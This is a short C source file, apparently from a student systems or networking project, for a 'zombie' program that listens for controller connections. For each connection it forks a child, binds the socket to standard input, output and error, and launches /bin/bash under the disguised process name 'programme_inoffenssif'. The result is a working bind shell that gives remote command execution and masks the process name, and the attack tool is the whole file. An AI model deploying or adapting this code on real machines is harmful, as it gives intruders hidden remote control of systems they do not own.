    #include <stdio.h>
    #include <stdlib.h>
    #include <sys/ipc.h>
    #include <sys/shm.h>
    #include <unistd.h>
    #include <string.h>

    #include "utils_v2.h"
    #include "info.h"
    #include "reseau.h"

    void zombieFils(void* sockfdController){
        int* sockfd = sockfdController;

        dup2(*sockfd, STDOUT_FILENO);
        dup2(*sockfd, STDERR_FILENO);
        dup2(*sockfd,STDIN_FILENO);
        sclose(*sockfd);
        sexecl("/bin/bash", "programme_inoffenssif", NULL);
    }

    int main(int argc, char *argv[]){

        int sockfd = initSocketZombie();
        int i = 0;

        int* sockfdController = smalloc(NB_PORTS*sizeof(int));

        for (int j = 0; j < NB_PORTS; j++) {
            sockfdController[j] = -1;
        }
        
        while(true){
            sockfdController[i] = accept(sockfd, NULL, NULL);

            if(sockfdController[i] != -1){
                fork_and_run1(zombieFils, &sockfdController[i]);
                i++;
            }else {
                break;
            }
        }

        free(sockfdController);
        
        return 0;
    }
